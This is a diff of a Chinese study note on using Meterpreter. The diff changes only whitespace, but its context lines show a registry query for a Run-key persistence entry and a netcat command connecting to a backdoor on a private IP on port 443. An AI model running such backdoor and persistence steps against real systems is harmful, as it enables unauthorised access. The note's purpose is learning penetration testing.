@@ -1,4 +1,5 @@
 ---
+
 title: meterpreter使用方式
 published: 2023-08-02 13:14:41
 tags: ["Kali Linux","Metasploit","Meterpreter","学习笔记"]
@@ -157,4 +158,3 @@ reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltes
 nc -v 192.168.159.144 443  #攻击者连接nc后门
 
 ```
-
